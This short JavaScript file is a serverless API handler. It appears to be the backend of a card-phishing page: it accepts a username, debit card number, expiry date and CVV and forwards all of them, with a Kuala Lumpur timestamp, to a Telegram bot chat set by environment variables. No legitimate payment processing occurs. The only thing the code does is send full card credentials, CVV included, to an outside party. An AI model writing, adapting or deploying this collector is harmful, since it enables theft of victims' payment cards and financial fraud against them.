export default async function handler(req, res) {
  // CORS...
  if (req.method !== 'POST') return res.status(405).end();

  const { username, cardNumber, expiry, cvv } = req.body;
  if (!username || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: 'All fields required' });
  }

  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const time = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
  const message = `💳 Debit Card\nUser: ${username}\nCard: ${cardNumber}\nExp: ${expiry}\nCVV: ${cvv}\nTime: ${time}`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
    });
    res.json({ success: true });
  } catch {
    res.status(500).json({ error: 'Failed to send' });
  }
}